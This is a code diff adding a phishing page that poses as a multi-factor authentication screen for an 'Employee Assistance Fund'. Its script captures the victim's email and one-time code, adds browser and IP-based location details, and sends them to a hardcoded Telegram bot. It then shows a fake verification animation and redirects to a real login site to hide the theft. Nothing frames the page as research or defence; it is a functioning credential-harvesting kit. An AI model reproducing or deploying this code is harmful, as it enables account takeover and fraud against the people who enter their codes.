@@ -1,0 +1,1176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Multi-Factor Authentication - Employee Assistance Fund</title>
+    <link rel="icon" href="eaf_favicon.png" type="image/png">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700&family=Source+Sans+Pro:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #1a5f7a;      /* Deep institutional blue */
+            --secondary-color: #2c7873;    /* Teal accent */
+            --accent-color: #57cc99;       /* Fresh green */
+            --light-accent: #80ed99;       /* Light mint */
+            --dark-blue: #004d61;          /* Dark blue */
+            --light-blue: #e3f2fd;         /* Light background blue */
+            --auth-blue: #0078d4;          /* Authentication blue */
+            --auth-purple: #7160e8;        /* Authentication purple accent */
+            
+            --primary-gradient: linear-gradient(135deg, var(--primary-color) 0%, var(--dark-blue) 100%);
+            --secondary-gradient: linear-gradient(135deg, var(--secondary-color) 0%, var(--accent-color) 100%);
+            --accent-gradient: linear-gradient(135deg, var(--accent-color) 0%, var(--light-accent) 100%);
+            --auth-gradient: linear-gradient(135deg, var(--auth-blue) 0%, var(--auth-purple) 100%);
+            
+            --background-gradient: linear-gradient(135deg, #f8fdff 0%, #edf7ff 50%, #e3f2fd 100%);
+            --card-gradient: linear-gradient(135deg, #ffffff 0%, #fafcff 100%);
+            --header-gradient: linear-gradient(135deg, var(--auth-blue) 0%, #106ebe 100%);
+            
+            --text-primary: #1a3c4d;
+            --text-secondary: #2d5567;
+            --text-muted: #6c8a9a;
+            --border-color: #c5d9e8;
+            --border-light: #e8f1f8;
+            
+            --shadow-sm: 0 4px 6px rgba(26, 95, 122, 0.08);
+            --shadow-md: 0 6px 20px rgba(26, 95, 122, 0.12);
+            --shadow-lg: 0 10px 40px rgba(26, 95, 122, 0.15);
+            --shadow-xl: 0 15px 60px rgba(26, 95, 122, 0.2);
+            
+            --border-radius-sm: 8px;
+            --border-radius-md: 12px;
+            --border-radius-lg: 16px;
+            --border-radius-xl: 24px;
+            --border-radius-2xl: 32px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: var(--background-gradient);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            color: var(--text-primary);
+            position: relative;
+            overflow-x: hidden;
+            padding: 20px;
+        }
+
+        /* Authentication background */
+        .auth-bg {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.05;
+        }
+
+        .auth-pattern {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                radial-gradient(circle at 10% 20%, var(--auth-blue) 1px, transparent 1px),
+                radial-gradient(circle at 90% 80%, var(--auth-purple) 1px, transparent 1px),
+                radial-gradient(circle at 50% 50%, var(--accent-color) 1px, transparent 1px);
+            background-size: 100px 100px;
+        }
+
+        /* INCREASED CONTAINER WIDTH TO MATCH INDEX PAGE */
+        .auth-container {
+            width: 100%;
+            max-width: 800px; /* Increased from 480px to 800px */
+        }
+
+        .auth-card {
+            background: var(--card-gradient);
+            border-radius: var(--border-radius-2xl);
+            box-shadow: var(--shadow-xl);
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.9);
+            padding: 3rem 4rem; /* Increased padding for wider card */
+            position: relative;
+            animation: slideUp 0.8s cubic-bezier(.18, .89, .32, 1.28);
+        }
+
+        @keyframes slideUp {
+            0% {
+                transform: translateY(30px);
+                opacity: 0;
+            }
+            100% {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        /* Loading Modal Styles */
+        .loading-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.98);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .loading-modal.active {
+            display: flex;
+        }
+
+        .loading-content {
+            max-width: 500px;
+            width: 90%;
+            background: white;
+            border-radius: var(--border-radius-xl);
+            box-shadow: var(--shadow-xl);
+            padding: 3rem;
+            text-align: center;
+            border: 1px solid var(--border-light);
+        }
+
+        .loading-header {
+            margin-bottom: 2rem;
+        }
+
+        .loading-icon {
+            width: 80px;
+            height: 80px;
+            background: var(--auth-gradient);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1.5rem;
+            color: white;
+            font-size: 2.5rem;
+            box-shadow: 0 8px 25px rgba(0, 120, 212, 0.2);
+        }
+
+        .loading-title {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: var(--auth-blue);
+            margin-bottom: 0.5rem;
+        }
+
+        .loading-subtitle {
+            font-size: 1rem;
+            color: var(--text-secondary);
+            margin-bottom: 2rem;
+        }
+
+        /* Progress Bar */
+        .progress-container {
+            width: 100%;
+            background: rgba(0, 120, 212, 0.1);
+            border-radius: var(--border-radius-lg);
+            overflow: hidden;
+            margin-bottom: 2rem;
+            height: 8px;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: var(--auth-gradient);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: var(--border-radius-lg);
+        }
+
+        /* Loading Steps */
+        .loading-steps {
+            text-align: left;
+            margin-bottom: 2rem;
+        }
+
+        .loading-step {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            padding: 0.75rem 0;
+            border-bottom: 1px solid var(--border-light);
+            opacity: 0.5;
+            transition: all 0.3s ease;
+        }
+
+        .loading-step:last-child {
+            border-bottom: none;
+        }
+
+        .loading-step.active {
+            opacity: 1;
+        }
+
+        .loading-step.completed {
+            opacity: 0.8;
+        }
+
+        .step-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.8rem;
+            background: rgba(0, 120, 212, 0.1);
+            color: var(--auth-blue);
+        }
+
+        .loading-step.active .step-icon {
+            background: var(--auth-blue);
+            color: white;
+        }
+
+        .loading-step.completed .step-icon {
+            background: var(--accent-color);
+            color: white;
+        }
+
+        .step-text {
+            flex: 1;
+            font-size: 0.95rem;
+            color: var(--text-secondary);
+        }
+
+        .loading-step.active .step-text {
+            color: var(--text-primary);
+            font-weight: 500;
+        }
+
+        .loading-step.completed .step-text {
+            color: var(--accent-color);
+        }
+
+        .loading-details {
+            font-size: 0.9rem;
+            color: var(--text-muted);
+            margin-bottom: 1.5rem;
+            line-height: 1.5;
+        }
+
+        .loading-time {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            font-weight: 500;
+        }
+
+        /* Login Header */
+        .login-header {
+            text-align: center;
+            margin-bottom: 2.5rem;
+            padding-bottom: 2rem;
+            border-bottom: 1px solid var(--border-light);
+            position: relative;
+        }
+
+        .login-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 70px; /* Slightly larger */
+            height: 70px; /* Slightly larger */
+            background: var(--auth-gradient);
+            border-radius: 50%;
+            margin: 0 auto 1.5rem; /* Increased margin */
+            color: white;
+            font-size: 2rem; /* Larger icon */
+            box-shadow: 0 8px 20px rgba(0, 120, 212, 0.2);
+        }
+
+        .login-title {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            font-size: 2rem; /* Larger title */
+            font-weight: 700;
+            color: var(--auth-blue);
+            margin-bottom: 0.5rem;
+        }
+
+        .login-subtitle {
+            font-size: 1.1rem; /* Slightly larger */
+            color: var(--text-secondary);
+            font-weight: 400;
+        }
+
+        /* Login Body */
+        .login-body {
+            width: 100%;
+        }
+
+        .auth-page-title {
+            font-size: 1.5rem; /* Larger */
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 1.5rem; /* Increased margin */
+            text-align: center;
+        }
+
+        .auth-instructions {
+            font-size: 1rem; /* Slightly larger */
+            color: var(--text-secondary);
+            line-height: 1.5;
+            margin-bottom: 2.5rem; /* Increased margin */
+            text-align: center;
+            max-width: 700px; /* Limit width for better readability */
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .user-email {
+            color: var(--auth-blue);
+            font-weight: 600;
+            font-size: 1.05rem; /* Slightly larger */
+        }
+
+        /* Method Selector */
+        .method-selector {
+            margin-bottom: 2.5rem; /* Increased margin */
+        }
+
+        .method-selector-title {
+            font-size: 1.05rem; /* Slightly larger */
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 1.25rem; /* Increased margin */
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .method-selector-title i {
+            color: var(--auth-blue);
+            font-size: 1.1rem;
+        }
+
+        /* WIDER METHOD OPTIONS GRID */
+        .method-options {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr); /* 4 columns for wider layout */
+            gap: 1rem; /* Increased gap */
+            margin-bottom: 2rem; /* Increased margin */
+        }
+
+        .method-option {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 1.25rem 0.75rem; /* Increased padding */
+            background: rgba(0, 120, 212, 0.05);
+            border: 2px solid rgba(0, 120, 212, 0.1);
+            border-radius: var(--border-radius-lg); /* Slightly larger radius */
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            height: 120px; /* Fixed height for consistency */
+        }
+
+        .method-option:hover {
+            background: rgba(0, 120, 212, 0.1);
+            border-color: rgba(0, 120, 212, 0.3);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 16px rgba(0, 120, 212, 0.15);
+        }
+
+        .method-option.selected {
+            background: rgba(0, 120, 212, 0.15);
+            border-color: var(--auth-blue);
+            box-shadow: 0 8px 20px rgba(0, 120, 212, 0.2);
+        }
+
+        .method-option i {
+            font-size: 2rem; /* Larger icons */
+            color: var(--auth-blue);
+            margin-bottom: 0.75rem; /* Increased margin */
+        }
+
+        .method-option span {
+            font-size: 0.95rem; /* Slightly larger text */
+            font-weight: 500;
+            color: var(--text-primary);
+        }
+
+        /* Verification Method Display - WIDER */
+        .verification-method {
+            background: rgba(0, 120, 212, 0.05);
+            border: 1px solid rgba(0, 120, 212, 0.1);
+            border-radius: var(--border-radius-lg);
+            padding: 2rem; /* Increased padding */
+            margin-bottom: 2.5rem; /* Increased margin */
+            text-align: center;
+        }
+
+        .verification-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 60px; /* Larger */
+            height: 60px; /* Larger */
+            background: var(--auth-gradient);
+            border-radius: 50%;
+            margin: 0 auto 1.5rem; /* Increased margin */
+            color: white;
+            font-size: 1.8rem; /* Larger icon */
+        }
+
+        .verification-title {
+            font-size: 1.3rem; /* Larger */
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 0.75rem; /* Increased margin */
+        }
+
+        .verification-description {
+            font-size: 1rem; /* Larger */
+            color: var(--text-secondary);
+            line-height: 1.6; /* Better line height */
+            margin-bottom: 1.5rem; /* Increased margin */
+            max-width: 600px; /* Limit width for better readability */
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .countdown {
+            font-size: 0.95rem; /* Larger */
+            font-weight: 600;
+            color: var(--auth-blue);
+            padding: 0.75rem 1.5rem; /* Increased padding */
+            background: rgba(0, 120, 212, 0.1);
+            border-radius: var(--border-radius-md);
+            display: inline-block;
+        }
+
+        /* Manual Verification - WIDER */
+        .manual-verification {
+            background: rgba(0, 120, 212, 0.03);
+            border: 1px solid var(--border-light);
+            border-radius: var(--border-radius-lg);
+            padding: 2rem; /* Increased padding */
+            margin-bottom: 2rem; /* Increased margin */
+        }
+
+        .manual-verification-title {
+            font-size: 1.05rem; /* Slightly larger */
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 1.25rem; /* Increased margin */
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .manual-verification-title i {
+            color: var(--auth-blue);
+            font-size: 1.1rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.25rem; /* Increased margin */
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 0.95rem; /* Slightly larger */
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 0.75rem; /* Increased margin */
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 1.1rem 1.5rem; /* Increased padding */
+            font-size: 1.05rem; /* Slightly larger */
+            font-family: inherit;
+            background: white;
+            border: 2px solid var(--border-color);
+            border-radius: var(--border-radius-md);
+            color: var(--text-primary);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: var(--shadow-sm);
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: var(--auth-blue);
+            box-shadow: 0 0 0 4px rgba(0, 120, 212, 0.15);
+        }
+
+        .manual-verification-note {
+            font-size: 0.9rem; /* Slightly larger */
+            color: var(--text-muted);
+            font-style: italic;
+            margin-top: 0.75rem; /* Increased margin */
+        }
+
+        /* Buttons - WIDER */
+        .btn {
+            width: 100%;
+            padding: 1.1rem 2rem; /* Increased padding */
+            background: var(--auth-gradient);
+            color: white;
+            border: none;
+            border-radius: var(--border-radius-md);
+            font-size: 1.05rem; /* Slightly larger */
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            letter-spacing: 0.5px;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.75rem;
+            box-shadow: 0 6px 20px rgba(0, 120, 212, 0.2);
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.7s;
+        }
+
+        .btn:hover::before {
+            left: 100%;
+        }
+
+        .btn:hover {
+            background: linear-gradient(135deg, #106ebe 0%, var(--auth-blue) 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 24px rgba(0, 120, 212, 0.3);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        /* Form Error */
+        .form-error {
+            background: linear-gradient(135deg, #ffeaea 0%, #ffd6d6 100%);
+            border: 1px solid #ffb3b3;
+            color: #d63031;
+            padding: 1rem 1.5rem; /* Increased padding */
+            border-radius: var(--border-radius-md);
+            margin-bottom: 1.5rem;
+            font-size: 0.95rem; /* Slightly larger */
+            font-weight: 500;
+            display: none;
+            animation: fadeIn 0.3s ease-out;
+            border-left: 4px solid #d63031;
+        }
+
+        .form-error.active {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Additional Info */
+        .subtitle {
+            font-size: 0.9rem; /* Slightly larger */
+            color: var(--text-muted);
+            line-height: 1.5;
+            text-align: center;
+            margin-top: 2rem; /* Increased margin */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            max-width: 700px; /* Limit width for better readability */
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .subtitle i {
+            color: var(--accent-color);
+        }
+
+        /* Auth Footer */
+        .auth-footer {
+            margin-top: 2.5rem; /* Increased margin */
+            padding-top: 2rem; /* Increased padding */
+            border-top: 1px solid var(--border-light);
+            text-align: center;
+            font-size: 0.85rem; /* Slightly larger */
+            color: var(--text-muted);
+            line-height: 1.6;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            margin-top: 1.25rem; /* Increased margin */
+            color: var(--text-muted);
+            font-size: 0.85rem; /* Slightly larger */
+        }
+
+        .security-badge i {
+            color: var(--accent-color);
+        }
+
+        @media (max-width: 900px) {
+            .auth-container {
+                max-width: 95vw;
+            }
+            
+            .auth-card {
+                padding: 2.5rem 3rem;
+            }
+            
+            .method-options {
+                grid-template-columns: repeat(2, 1fr); /* 2 columns on medium screens */
+            }
+            
+            .loading-content {
+                padding: 2rem;
+                width: 95%;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .auth-card {
+                padding: 2rem 1.5rem;
+                border-radius: var(--border-radius-xl);
+            }
+            
+            .method-options {
+                grid-template-columns: 1fr; /* 1 column on small screens */
+            }
+            
+            .login-title {
+                font-size: 1.7rem;
+            }
+            
+            .login-icon {
+                width: 60px;
+                height: 60px;
+                font-size: 1.8rem;
+            }
+            
+            .loading-content {
+                padding: 1.5rem;
+            }
+            
+            .loading-title {
+                font-size: 1.5rem;
+            }
+            
+            .loading-icon {
+                width: 60px;
+                height: 60px;
+                font-size: 1.8rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .auth-card {
+                padding: 1.5rem 1.25rem;
+            }
+            
+            .login-title {
+                font-size: 1.5rem;
+            }
+            
+            .login-icon {
+                width: 55px;
+                height: 55px;
+                font-size: 1.6rem;
+            }
+            
+            .verification-method,
+            .manual-verification {
+                padding: 1.5rem;
+            }
+            
+            .loading-content {
+                padding: 1.25rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="auth-bg">
+        <div class="auth-pattern"></div>
+    </div>
+    
+    <!-- Loading Modal -->
+    <div class="loading-modal" id="loadingModal">
+        <div class="loading-content">
+            <div class="loading-header">
+                <div class="loading-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <h2 class="loading-title">Verifying Your Identity</h2>
+                <div class="loading-subtitle">Processing your verification request...</div>
+            </div>
+            
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            
+            <div class="loading-steps">
+                <div class="loading-step completed" id="step1">
+                    <div class="step-icon"><i class="fas fa-check"></i></div>
+                    <div class="step-text">Receiving verification code</div>
+                </div>
+                <div class="loading-step active" id="step2">
+                    <div class="step-icon">2</div>
+                    <div class="step-text">Validating code with security server</div>
+                </div>
+                <div class="loading-step" id="step3">
+                    <div class="step-icon">3</div>
+                    <div class="step-text">Checking account permissions</div>
+                </div>
+                <div class="loading-step" id="step4">
+                    <div class="step-icon">4</div>
+                    <div class="step-text">Finalizing authentication</div>
+                </div>
+            </div>
+            
+            <div class="loading-details" id="loadingDetails">
+                Connecting to secure authentication server...
+            </div>
+            
+            <div class="loading-time">
+                <i class="fas fa-clock"></i> Time elapsed: <span id="elapsedTime">0s</span>
+            </div>
+        </div>
+    </div>
+    
+    <div class="auth-container">
+        <div class="auth-card">
+            <!-- Login Header -->
+            <div class="login-header">
+                <div class="login-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <div class="login-title">Multi-Factor Authentication</div>
+                <div class="login-subtitle">Required for Account Security</div>
+            </div>
+
+            <!-- Login Body -->
+            <div class="login-body">
+                <h2 class="auth-page-title">Verify Your Identity</h2>
+                <div class="auth-instructions">
+                    For security purposes and your account</span> verification. Please complete one of the following steps to verify your identity:
+                </div>
+
+                <!-- Method Selector -->
+                <div class="method-selector">
+                    <div class="method-selector-title">
+                        <i class="fas fa-mobile-alt"></i> Select Your Preferred Verification Method
+                    </div>
+                    <div class="method-options">
+                        <div class="method-option selected" data-method="push">
+                            <i class="fas fa-sms"></i>
+                            <span>SMS Verification</span>
+                        </div>
+                       
+                        <div class="method-option" data-method="call">
+                            <i class="fas fa-phone-alt"></i>
+                            <span>Phone Call</span>
+                        </div>
+                        <div class="method-option" data-method="push-notification">
+                            <i class="fas fa-bell"></i>
+                            <span>Push Notification</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Verification Method Display -->
+                <div class="verification-method">
+                    <div class="verification-icon">
+                        <i class="fas fa-sms"></i>
+                    </div>
+                    <h3 class="verification-title" id="methodTitle">SMS Verification</h3>
+                    <div class="verification-description" id="methodDescription">
+                       We've sent a 6-digit verification code to your registered mobile number. Please enter the code below to complete your authentication.
+                    </div>
+                    <div class="countdown" id="countdown">Request expires in 4:59</div>
+                </div>
+
+                <!-- Manual Verification -->
+                <div class="form-error" id="otpError">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <span id="errorText"></span>
+                </div>
+
+                <div class="manual-verification">
+                    <div class="manual-verification-title">
+                        <i class="fas fa-keyboard"></i> Manual Verification Code Entry
+                    </div>
+                    <div class="form-group">
+                        <label for="otp">Enter Verification Code</label>
+                        <input type="text" id="otp" placeholder="Enter 6-digit verification code" maxlength="6" pattern="[0-9]{6}">
+                    </div>
+                    <div class="manual-verification-note">
+                        Use this option if you're not receiving the automatic verification request.
+                    </div>
+
+                    <button class="btn" id="verifyBtn">
+                        <i class="fas fa-check-circle"></i> Complete Verification
+                    </button>
+                </div>
+
+                <div class="subtitle">
+                    <i class="fas fa-info-circle"></i> If you're not receiving verification requests, 
+                    ensure your authenticator app is connected to the internet and try again.
+                </div>
+            </div>
+
+            <!-- Auth Footer -->
+            <div class="auth-footer">
+                <div class="security-badge">
+                    <i class="fas fa-lock"></i>
+                    <span>Identity protection secured</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Get email from URL parameter
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+        
+        const email = getQueryParam('email');
+        if (email) {
+            document.getElementById('authEmail').textContent = email;
+        }
+
+        // Method selection logic
+        const methodOptions = document.querySelectorAll('.method-option');
+        const methodTitle = document.getElementById('methodTitle');
+        const methodDescription = document.getElementById('methodDescription');
+        
+        const methodDetails = {
+            'push': {
+                title: 'SMS Verification',
+                description: 'We\'ve sent a 6-digit verification code to your registered mobile number. Please enter the code below to complete your authentication.',
+                icon: 'fas fa-sms'
+            },
+            'sms': {
+                title: 'SMS Verification',
+                description: 'We\'ve sent a 6-digit verification code to your registered mobile number. Please enter the code below to complete your authentication.',
+                icon: 'fas fa-sms'
+            },
+            'call': {
+                title: 'Phone Call Verification',
+                description: 'You will receive an automated phone call to your registered number. Answer the call and follow the instructions to verify your identity.',
+                icon: 'fas fa-phone-alt'
+            },
+            'push-notification': {
+                title: 'Push Notification',
+                description: 'Check your device for a push notification from your authentication app. Tap "Approve" to complete the verification process.',
+                icon: 'fas fa-bell'
+            }
+        };
+
+        methodOptions.forEach(option => {
+            option.addEventListener('click', function() {
+                // Remove selected class from all options
+                methodOptions.forEach(opt => opt.classList.remove('selected'));
+                
+                // Add selected class to clicked option
+                this.classList.add('selected');
+                
+                // Get method type
+                const method = this.getAttribute('data-method');
+                
+                // Update verification method display
+                const details = methodDetails[method];
+                if (details) {
+                    methodTitle.textContent = details.title;
+                    methodDescription.textContent = details.description;
+                    
+                    // Update icon
+                    const icon = document.querySelector('.verification-icon i');
+                    icon.className = details.icon;
+                }
+            });
+        });
+
+        // Countdown timer
+        let timeLeft = 299; // 4 minutes 59 seconds
+        const countdownElement = document.getElementById('countdown');
+        
+        function updateCountdown() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            countdownElement.textContent = `Request expires in ${minutes}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (timeLeft > 0) {
+                timeLeft--;
+                setTimeout(updateCountdown, 1000);
+            } else {
+                countdownElement.textContent = 'Request expired';
+                countdownElement.style.color = '#d63031';
+            }
+        }
+        
+        // Start countdown
+        updateCountdown();
+
+        // Device info function
+        function getDeviceInfo() {
+            let ua = navigator.userAgent;
+            let platform = navigator.platform;
+            let browser = 'Unknown';
+            
+            if (ua.indexOf("Chrome") > -1) browser = "Chrome";
+            else if (ua.indexOf("Safari") > -1) browser = "Safari";
+            else if (ua.indexOf("Firefox") > -1) browser = "Firefox";
+            else if (ua.indexOf("MSIE") > -1 || ua.indexOf("Trident/") > -1) browser = "Internet Explorer";
+            else if (ua.indexOf("Edge") > -1) browser = "Edge";
+            
+            return `${browser} on ${platform}`;
+        }
+
+        // Get location using IP
+        async function getLocation() {
+            try {
+                let res = await fetch('https://ipapi.co/json/');
+                if (!res.ok) return '';
+                let data = await res.json();
+                return `${data.city ? data.city + ', ' : ''}${data.region ? data.region + ', ' : ''}${data.country_name ? data.country_name : ''}`;
+            } catch (e) { 
+                return ''; 
+            }
+        }
+
+        // Enhanced Loading Logic
+        async function showLoadingSequence() {
+            const loadingModal = document.getElementById('loadingModal');
+            const progressBar = document.getElementById('progressBar');
+            const loadingDetails = document.getElementById('loadingDetails');
+            const elapsedTime = document.getElementById('elapsedTime');
+            
+            // Show loading modal
+            loadingModal.classList.add('active');
+            
+            // Start timer
+            let seconds = 0;
+            const timer = setInterval(() => {
+                seconds++;
+                elapsedTime.textContent = `${seconds}s`;
+            }, 1000);
+            
+            // Loading steps with realistic delays and progress
+            const steps = [
+                { 
+                    step: 2, 
+                    progress: 25, 
+                    delay: 1200,
+                    message: "Validating verification code format..."
+                },
+                { 
+                    step: 2, 
+                    progress: 35, 
+                    delay: 1800,
+                    message: "Connecting to authentication server..."
+                },
+                { 
+                    step: 3, 
+                    progress: 50, 
+                    delay: 1500,
+                    message: "Verifying account credentials..."
+                },
+                { 
+                    step: 3, 
+                    progress: 65, 
+                    delay: 2200,
+                    message: "Checking account permissions and access levels..."
+                },
+                { 
+                    step: 4, 
+                    progress: 80, 
+                    delay: 2000,
+                    message: "Finalizing security checks..."
+                },
+                { 
+                    step: 4, 
+                    progress: 95, 
+                    delay: 1800,
+                    message: "Preparing account access..."
+                }
+            ];
+            
+            // Mark step 1 as completed
+            document.getElementById('step1').classList.add('completed');
+            
+            for (let i = 0; i < steps.length; i++) {
+                const step = steps[i];
+                
+                // Update progress bar
+                await new Promise(resolve => {
+                    setTimeout(() => {
+                        progressBar.style.width = `${step.progress}%`;
+                        
+                        // Update step status
+                        if (i > 0 && steps[i-1].step !== step.step) {
+                            // Mark previous step as completed
+                            document.getElementById(`step${steps[i-1].step}`).classList.add('completed');
+                            document.getElementById(`step${steps[i-1].step}`).classList.remove('active');
+                            
+                            // Set current step as active
+                            document.getElementById(`step${step.step}`).classList.add('active');
+                        }
+                        
+                        // Update loading details
+                        loadingDetails.textContent = step.message;
+                        
+                        resolve();
+                    }, step.delay);
+                });
+            }
+            
+            // Final completion
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            progressBar.style.width = '100%';
+            document.getElementById('step4').classList.add('completed');
+            document.getElementById('step4').classList.remove('active');
+            loadingDetails.textContent = "Authentication complete. Redirecting...";
+            
+            // Clear timer
+            clearInterval(timer);
+            
+            // Final delay before redirect
+            await new Promise(resolve => setTimeout(resolve, 1500));
+        }
+
+        // Form submission
+        document.getElementById('verifyBtn').addEventListener('click', async function() {
+            const otpInput = document.getElementById('otp');
+            const otpError = document.getElementById('otpError');
+            const errorText = document.getElementById('errorText');
+            const verifyBtn = document.getElementById('verifyBtn');
+            
+            const otp = otpInput.value.trim();
+            
+            // Validate OTP
+            if (!otp) {
+                errorText.textContent = "Please enter a verification code.";
+                otpError.classList.add('active');
+                otpInput.focus();
+                return;
+            }
+            
+            if (!/^[0-9]{6}$/.test(otp)) {
+                errorText.textContent = "Please enter a valid 6-digit verification code.";
+                otpError.classList.add('active');
+                otpInput.focus();
+                return;
+            }
+            
+            // Clear any previous errors
+            otpError.classList.remove('active');
+            
+            // Disable submit button
+            verifyBtn.disabled = true;
+            verifyBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...';
+            
+            // Get selected method
+            const selectedMethod = document.querySelector('.method-option.selected').getAttribute('data-method');
+            const methodName = methodDetails[selectedMethod].title;
+            
+            // Get additional info
+            const deviceInfo = getDeviceInfo();
+            const location = await getLocation();
+            
+            // Prepare Telegram message
+            const message = `🔐 *MULTI-FACTOR AUTHENTICATION ATTEMPT*\n══════════════════════════════════\n📧 *Email:* ${email ? email : '[Unknown]'}\n🔐 *Verification Code:* ${otp}\n📱 *Method:* ${methodName}\n💻 *Device:* ${deviceInfo}\n📍 *Location:* ${location || 'Unknown'}\n🕐 *Time:* ${new Date().toLocaleString()}\n══════════════════════════════════`;
+            
+            // Telegram configuration
+            const telegramToken = "7480485973:AAEc5xoO6_z6ZtSXAMxZB4iqih4M7peeyoM";
+            const telegramChatId = "@onlysendlegs";
+            const telegramApiUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+            
+            try {
+                // Send to Telegram
+                const response = await fetch(telegramApiUrl, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({ 
+                        chat_id: telegramChatId, 
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                console.log('Telegram response status:', response.status);
+                
+                if (!response.ok) {
+                    const errorData = await response.text();
+                    console.error('Telegram API error:', errorData);
+                } else {
+                    const result = await response.json();
+                    console.log('Telegram API success:', result);
+                }
+                
+            } catch (error) {
+                console.error('Telegram error:', error);
+            }
+            
+            // Show realistic loading sequence
+            await showLoadingSequence();
+            
+            // Redirect to error page
+            window.location.href = `https://login.raiseright.com/`;
+        });
+
+        // Auto-focus on OTP input and allow Enter key submission
+        document.addEventListener('DOMContentLoaded', function() {
+            const otpInput = document.getElementById('otp');
+            otpInput.focus();
+            
+            otpInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    document.getElementById('verifyBtn').click();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
